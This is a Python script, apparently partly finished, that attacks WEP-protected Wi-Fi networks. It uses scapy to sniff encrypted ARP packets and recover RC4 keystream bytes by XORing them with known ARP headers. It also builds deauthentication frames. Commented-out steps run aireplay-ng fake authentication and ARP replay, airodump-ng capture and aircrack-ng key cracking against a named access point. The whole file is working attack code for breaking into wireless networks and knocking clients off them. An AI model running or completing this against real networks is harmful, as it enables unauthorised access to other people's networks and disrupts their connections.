# NOTE
# 50% chance IV repeats after 5000 packets

from scapy.all import *
import binascii
from argparse import ArgumentParser as AP
import subprocess

# Global variables
ARP_REQUEST_PATTERN = 'aaaa0300000008060001080006040001'
ARP_RESPONSE_PATTERN = 'aaaa0300000008060001080006040002'
keystreams = {}
arp_packets_captured = 0
iface = 'wlan0'


def deauth(count: int, bssid: str, target_mac: str):
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    return frame


def expand(x):
    yield x.name
    while x.payload:
        x = x.payload
        yield x.name


def arp_monitor_callback(pkt):
    global arp_packets_captured
    global iface
    if len(pkt) == 112 or len(pkt) == 110 or len(pkt) == 80 or len(pkt) == 81:
        layers = list(expand(pkt))
        if '802.11 WEP packet' in layers:
            if len(pkt.wepdata) == 36:
                if arp_packets_captured % 1000 == 0:
                    print(arp_packets_captured)
                src_address = pkt.addr2
                bssid = pkt.addr1
                iv_bytes = binascii.hexlify(pkt.iv)
                iv_hexstring = iv_bytes.decode('UTF-8')
                data_bytes = binascii.hexlify(pkt.wepdata)
                data_hexstring = data_bytes.decode('UTF-8')[:32]
                data_dec = int(data_hexstring, 16)

                # ARP request
                if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
                    xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
                    keystream_first_bytes = hex(xor)[2:]
                    if iv_hexstring not in keystreams:
                        arp_packets_captured += 1
                        keystreams[iv_hexstring] = keystream_first_bytes
                # ARP response
                else:
                    xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
                    keystream_first_bytes = hex(xor)[2:]
                    if iv_hexstring not in keystreams:
                        arp_packets_captured += 1
                        keystreams[iv_hexstring] = keystream_first_bytes


def stop_condition(pkt):
    global arp_packets_captured
    if arp_packets_captured > 5000: return True


if __name__ == "__main__":
    parser = AP(description="Capture ARP packets, exctract the RC4 keystreams, and crack the WEP key.")
    parser.add_argument("-i", "--interface", help="interface to sniff and send packets from", required=True)
    parser.add_argument("-a", "--access_point", help="MAC address of the access point, also known as the BSSID of the network.", required=True)
    parser.add_argument("-s", "--source", help="MAC address of the device injecting the packets. run ifconfig to find it", required=True)
    parser.add_argument("-c", "--channel", help="Channel that target network is operation on.", required=True)
    parser.add_argument("-p", "--packets", help="packets per second to inject", default=500)
    parser.add_argument("-t", "--target", help="MAC address of the target device for the de-auth attack, default is broadcast", default='ff:ff:ff:ff:ff:ff')
    parser.add_argument("-n", "--number_deauth", help="Number of de-auth packets to send per batch", default=25)
    parser.add_argument("-r", "--captured_arp_packets", help="Number of IVs to capture before attempting to crack password.")
    args = parser.parse_args()

    iface = args.interface
    access_point = args.access_point
    source_mac = args.source
    network_channel = args.channel
    packets_per_second = args.packets
    de_auth_target = args.target
    de_auth_packet_count = args.number_deauth
    packet_capture_count = args.captured_arp_packets

    # TODO Start this on a new thread
    # NOTE Only need this if we do it ourselves
    sniff(iface=iface, prn=arp_monitor_callback, store=0, stop_filter=stop_condition)

    cmd_fake_auth = 'aireplay-ng'
    cmd_arpreplay = 'aireplay-ng'
    cmd_airodump = 'airodump-ng'
    cmd_aircrack = 'aircrack-ng'


    # TODO Start this on another thread
    # aireplay-ng --fakeauth 0 -a C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
    # fake_auth = subprocess.Popen([cmd_fake_auth, '--fakeauth 0', f'-a {access_point}', f'-h {source_mac}', iface], stdout = subprocess.PIPE)
    # aireplay-ng --arpreplay -b C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
    # arpreplay = subprocess.Popen([cmd_arpreplay, '--arpreplay', f'-b {access_point}', f'-h {source_mac}', iface], stdout = subprocess.PIPE)

    # TODO Start this on another thread
    # while arp_packets_captured < 1
        # deauth_packet = deauth(int(args.count), args.access_point, args.de_auth_target)
        # sendp(deauth_packet, iface=iface, count=de_auth_packet_count, inter=0.100)
    
    # TODO Start this on another thread
    # TODO Need to stop this after we have captured enough IVs
    # The number of IVs is listed in the output of the program, but it updates continuously on the spot, so I don't know how the subprocess handles that
    # --output-format ivs === This could potentially help solve this problem, it saves a file.ivs
    # airodump-ng wlp7s0 --bssid c4:12:f5:7c:7c:0c --channel 1 --write output
    # airodump = subprocess.Popen([cmd_airodump, iface, f'--bssid {access_point}', f'--channel {network_channel}', '--write output'], stdout = subprocess.PIPE)
    # get the output as a string
    # output = str(airodump.communicate())
    # store the output in the list
    # outputlist.append(output)

    # TODO After everything else is done (right number of packets captured) start cracking
    # aircrack-ng <file_name>
    # aircrack = subprocess.Popen([cmd_aircrack, 'output.cap'], stdout = subprocess.PIPE)
    
    # scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
    # for packet in scapy_cap:
    #     arp_monitor_callback(packet)

    # Once all threads are terminated move on to this and the calculating of the key
    with open('keystreams.txt', 'w') as f:
        print(len(keystreams))
        for key, value in keystreams.items():
            # print(f'{key} - {value}')
            f.write(f'{key}:{value}\n')